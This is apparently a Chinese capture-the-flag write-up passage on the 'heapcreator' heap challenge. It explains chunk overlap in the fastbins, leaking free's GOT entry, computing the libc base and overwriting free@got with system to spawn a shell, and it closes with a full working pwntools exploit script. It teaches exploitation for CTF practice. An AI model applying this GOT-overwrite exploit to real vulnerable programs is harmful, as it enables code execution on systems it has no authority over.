前面已经提到过，我们的计划是将free()函数替换成system()函数，这样一来我们部署好的“/bin/sh”字符串就可以作为system()函数的参数了。但是这个程序本身并没有system()函数，所以就需要泄露出某一个函数的got表地址，进而通过pwntools的工具来找出libc基地址，加上偏移之后找到system()函数。那么首先第一步就是泄露，**<font style="color:#F5222D;">因为这个程序本身就存在free()函数，那么就直接泄露free_got了。</font>**

上一步我们已经将extend的0x41大小的chunk准备好了，这一步直接在操作流程中申请0x30个字节的堆块就可以直接调用了。这里有一个点需要注意，**<font style="color:#F5222D;">在创建堆块的时候实际上申请的是两个chunk</font>**：

+ <font style="color:#9cdcfe;">heaparray</font><font style="color:#d4d4d4;">[</font><font style="color:#9cdcfe;">i</font><font style="color:#d4d4d4;">] = (</font><font style="color:#569cd6;">struct</font><font style="color:#d4d4d4;"> </font><font style="color:#4ec9b0;">heap</font><font style="color:#d4d4d4;"> *)</font><font style="color:#dcdcaa;">malloc</font><font style="color:#d4d4d4;">(</font><font style="color:#569cd6;">sizeof</font><font style="color:#d4d4d4;">(</font><font style="color:#569cd6;">struct</font><font style="color:#d4d4d4;"> </font><font style="color:#4ec9b0;">heap</font><font style="color:#d4d4d4;">));</font>
+ <font style="color:#9cdcfe;">heaparray</font><font style="color:#d4d4d4;">[</font><font style="color:#9cdcfe;">i</font><font style="color:#d4d4d4;">]-></font><font style="color:#9cdcfe;">content</font><font style="color:#d4d4d4;"> = (</font><font style="color:#569cd6;">char</font><font style="color:#d4d4d4;"> *)</font><font style="color:#dcdcaa;">malloc</font><font style="color:#d4d4d4;">(</font><font style="color:#9cdcfe;">size</font><font style="color:#d4d4d4;">);</font>

首先申请的是结构体chunk，然后申请的是内容chunk。这个已经说过很多遍了，但是这里要强调的是由于结构体是自定义的，整个结构体只需要0x21个字节就够可以了，所以在申请结构体chunk的时候首先会在fastbin中查找是否有合适大小的chunk可以使用。此时fastbin的0x20链表中挂着之前释放掉的heap2结构体内容chunk，所以刚刚好0x20个字节，这`0x603060`部分的空间就被启用了。接下来由于申请内容大小为0x30，所以fastbin的0x40链表中刚好有之前extent_chunk，所以`0x603040`这部分的空间就被启用了。

**<font style="color:#F5222D;">需要注意的是：</font>**`**<font style="color:#F5222D;">0x603060先被启用，0x603040后被启用</font>**`**<font style="color:#F5222D;">，这就意味着先被启用的0x20的chunk会被0x40的chunk所覆盖！！！</font>**

**<font style="color:#F5222D;">使用之前的图讲解一下：</font>**

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600337870008-03e11c86-d8b9-4425-b86c-28e424de2b2e.png)

请注意，绿色框中的chunk先被启用，红色框中的chunk后被启用，如果在红色chunk中写东西，绿色chunk就会被覆盖。很不巧的是绿色chunk就是新建的heap结构体chunk，红色的就是结构体内容chunk。我们看下图重新申请这段空间并且只写入少量字符串不完全覆盖时候的样子：

> 借用一下hollk师傅的图片，
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600338754458-bb4fd0e5-ab2a-4676-9848-95bac1a46b08.png)

虽说新建0x30的heap之后结构体chunk会被覆盖，但是功能不会变。如果想要对0x30这个heap进行操作的话第一步还是得先找结构体，然后根据content成员变量去找内容chunk的data。那么这样一来我们的思路就有了，既然内容chunk可以覆盖结构体的content成员变量，那么我们将content成员变量的指针覆盖成free_got指针，然后再打印这个0x30的heap，这样一来打印的最终目的地就指向了free函数的真实地址了：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600338923738-d4acb2d0-b6d2-4ce4-81f7-90301d9dd7da.png)

> payload = p64(0) * 3 + p64(0x21) + p64(0x30) + p64(heap.got['free'])
>

我们看一下创建之后的内存情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600339097574-667364f4-1f20-46e7-a293-8a11fdb03aa1.png)

接下来回到操作流程界面，我们打印一下这个0x30的heap，free函数地址就会被打印出来了，但是在接收打印出来的内容时需要处理一下：

```python
p.recvuntil("Content : ")
data = p.recvuntil("Done !")
free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))
```

## 将free()函数替换成system()函数
在得到了free()函数地址之后就可以用我们的老方法，先找到libc基地址，再加上system()函数偏移得到system()函数地址：

```python
libc_base = free_addr - libc.symbols['free']
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
```

这样一来就找到了system()函数，接下来就需要考虑的是怎么将free()函数地址替换成system()函数地址了。其实我们可以重新编辑0x30这个heap来实现对free_got中的内容：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600339846697-6c3060dd-9943-47e8-85f0-2400d1a0f9b4.png)

在对内容进行修改时，依然还是修改heap结构体中content成员变量指向的free_got中的内容，所以我们再一次修改的时候就可以直接将free_got指向的free_addr修改成system_addr：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600339846716-3c47608e-e1b2-4b4e-b28d-9627ae7cb725.png)

因为调用free()函数的时候程序也是去free_got指向的位置找函数地址，那么这样一来在程序调用free()函数的时候实际上调用的确实system()函数了.

```python
edit(1, p64(system_addr))
```

还记不记得之前部署在第一个heap中的"/bin/sh"字符串？字符串就是为这个时候准备的，当释放第一个heap的时候：

+ 原执行流程：free(binsh_addr)
+ 替换后执行流程：system("/bin/sh")

所以当我们释放第一个heap的时候就可以拿shell了！！！

# exp
```python
from pwn import *
context(log_level='DEBUG')

p = process('./heapcreator')
heap = ELF('./heapcreator')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def create(size, content):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(content)


def edit(idx, content):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))
    p.recvuntil(":")
    p.sendline(content)


def show(idx):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))


def delete(idx):
    p.recvuntil(":")
    p.sendline("4")
    p.recvuntil(":")
    p.sendline(str(idx))
    

create(0x18, "hollk")  
create(0x10, "hollk")  

edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")

delete(1)

create(0x30, p64(0) * 3 + p64(0x21) + p64(0x30) + p64(heap.got['free']))  
show(1)
p.recvuntil("Content : ")
data = p.recvuntil("Done !")

free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))

libc_base = free_addr - libc.symbols['free']
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']

edit(1, p64(system_addr))
#gdb.attach(p)
delete(0)
#gdb.attach(p)
p.interactive()
```

